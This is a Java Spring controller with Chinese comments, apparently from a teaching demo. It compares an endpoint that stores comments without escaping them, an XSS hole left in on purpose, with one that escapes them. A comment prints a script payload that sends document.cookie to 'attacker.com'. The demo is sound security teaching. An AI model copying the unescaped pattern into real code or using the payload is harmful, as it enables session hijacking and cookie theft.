package org.example.security.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.util.HtmlUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * XSS（跨站脚本攻击）漏洞演示控制器
 * XSS是一种注入攻击，攻击者将恶意脚本注入到受信任的网站中，
 * 当其他用户浏览该网站时，恶意脚本会在用户的浏览器中执行，
 * 从而导致会话劫持、数据窃取、网站污损等安全问题。
 */
@Controller
public class XssVulnerableController {
    
    private final List<String> vulnerableComments = new CopyOnWriteArrayList<>();
    private final List<String> safeComments = new CopyOnWriteArrayList<>();

    @GetMapping("/xss-demo")
    public String xssDemoPage(Model model) {
        model.addAttribute("vulnerableComments", vulnerableComments);
        model.addAttribute("safeComments", safeComments);
        return "xss-demo";
    }

    @PostMapping("/comment/clear")
    public String clearComments(Model model) {
        vulnerableComments.clear();
        safeComments.clear();
        model.addAttribute("vulnerableComments", vulnerableComments);
        model.addAttribute("safeComments", safeComments);
        model.addAttribute("message", "所有评论已清空");
        return "redirect:/xss-demo";
    }

    /**
     * 危险接口：直接返回用户输入，存在XSS风险
     * 
     * 漏洞原理：
     * - 直接将用户输入作为HTML内容返回，没有进行任何转义
     * - 攻击者可以输入包含恶意JavaScript代码的内容
     * - 当其他用户查看该内容时，恶意代码会在其浏览器中执行
     * 
     * 攻击方式：
     * - 输入：<script>alert('窃取Cookie：' + document.cookie)</script>
     * - 这将在用户浏览器中弹出包含Cookie信息的警告框
     * - 更严重的攻击：<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>
     * - 这会将用户的Cookie发送到攻击者的服务器
     * 
     * 风险后果：
     * - 会话劫持：攻击者获取用户的会话信息，冒充用户身份
     * - 数据窃取：获取用户的敏感信息（如Cookie、个人信息）
     * - 网站污损：在网站上显示恶意内容
     * - 钓鱼攻击：诱导用户输入敏感信息
     */
    @PostMapping("/comment/vulnerable")
    public String vulnerableAddComment(@RequestParam String content, Model model) {
        vulnerableComments.add(content);
        model.addAttribute("vulnerableComments", vulnerableComments);
        model.addAttribute("safeComments", safeComments);
        model.addAttribute("message", "评论已添加到危险区域（未转义）");
        return "xss-demo";
    }

    /**
     * 安全接口：HtmlUtils转义特殊字符
     * 
     * 修复思路：
     * 1. 输入验证：对用户输入进行验证，过滤危险字符
     * 2. 输出转义：对输出到HTML的内容进行转义，将特殊字符转换为HTML实体
     * 3. 内容安全策略（CSP）：通过HTTP头设置CSP，限制脚本的执行
     * 4. 框架防护：使用安全框架提供的防护功能
     * 
     * 安全最佳实践：
     * - 对所有用户输入进行验证和过滤
     * - 对所有输出到HTML的内容进行转义
     * - 实施内容安全策略（CSP）
     * - 使用现代前端框架，它们通常内置了XSS防护
     * - 定期进行安全审计和渗透测试
     */
    @PostMapping("/comment/safe")
    public String safeAddComment(@RequestParam String content, Model model) {
        String safeContent = HtmlUtils.htmlEscape(content);
        safeComments.add(safeContent);
        model.addAttribute("vulnerableComments", vulnerableComments);
        model.addAttribute("safeComments", safeComments);
        model.addAttribute("message", "评论已添加到安全区域（已转义）");
        return "xss-demo";
    }
}

